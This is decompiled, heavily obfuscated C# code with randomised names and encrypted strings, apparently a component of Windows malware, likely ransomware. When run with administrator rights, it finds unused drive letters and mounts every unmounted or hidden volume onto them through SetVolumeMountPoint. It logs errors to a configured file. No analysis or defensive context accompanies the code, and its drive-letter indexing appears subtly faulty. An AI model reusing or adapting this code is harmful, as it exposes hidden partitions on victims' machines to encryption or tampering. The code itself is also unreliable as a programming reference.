using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class LvUmKHjimIdzYt
{
	public enum jTyGqIZzOSEQF : uint
	{
		wIuMCoTzYu,
		bjbLKSWeuTiGam,
		CTTVRsYlnqsZc,
		gwFjrlxBSmUwSDv,
		PJnqlugysCoT,
		KBqmymbwXfuYLnkFP,
		spSSbeJbGUykm
	}

	private sealed class cKtOIQnEhTkA
	{
		public uint sCXKIGLEqDUYE;

		public uint WDLONMutEJjRUc;

		public char[] YtThNZCYOAy;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, YtThNZCYOAy, WDLONMutEJjRUc, ref sCXKIGLEqDUYE))
			{
				return YtThNZCYOAy.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern jTyGqIZzOSEQF GetDriveType([MarshalAs(UnmanagedType.LPStr)] string QwEBCOoZcISxP);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string PeKhDZZQmqtTn, char[] NYDBIzHfeEBjkX, uint KjtrcelRpCjFuqBh, ref uint twJLlSMyEdbgxY);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> OuXohXaLALksw()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void BpwDKVrzSZDb()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			cKtOIQnEhTkA CS_0024_003C_003E8__locals0 = new cKtOIQnEhTkA();
			string[] array = new string[26]
			{
				getString_0(107375736),
				getString_0(107375763),
				getString_0(107375758),
				getString_0(107375753),
				getString_0(107375716),
				getString_0(107375711),
				getString_0(107375706),
				getString_0(107375733),
				getString_0(107375728),
				getString_0(107375723),
				getString_0(107375718),
				getString_0(107375681),
				getString_0(107375676),
				getString_0(107375671),
				getString_0(107375698),
				getString_0(107375693),
				getString_0(107375688),
				getString_0(107375139),
				getString_0(107375134),
				getString_0(107375129),
				getString_0(107375156),
				getString_0(107375151),
				getString_0(107375146),
				getString_0(107375109),
				getString_0(107375104),
				getString_0(107375099)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == jTyGqIZzOSEQF.bjbLKSWeuTiGam)
				{
					array2[num++] = text;
				}
			}
			List<string> source = OuXohXaLALksw();
			CS_0024_003C_003E8__locals0.sCXKIGLEqDUYE = 0u;
			CS_0024_003C_003E8__locals0.WDLONMutEJjRUc = 120u;
			CS_0024_003C_003E8__locals0.YtThNZCYOAy = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.YtThNZCYOAy, CS_0024_003C_003E8__locals0.WDLONMutEJjRUc, ref CS_0024_003C_003E8__locals0.sCXKIGLEqDUYE) || CS_0024_003C_003E8__locals0.YtThNZCYOAy.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (XudtxnGtRBJeB.RxwgNpmsCUXw)
				{
					try
					{
						Console.WriteLine(getString_0(107375094), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (XudtxnGtRBJeB.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(XudtxnGtRBJeB.ndioqUCcjeEwRygxn, getString_0(107375069) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static LvUmKHjimIdzYt()
	{
		Strings.CreateGetStringDelegate(typeof(LvUmKHjimIdzYt));
	}
}
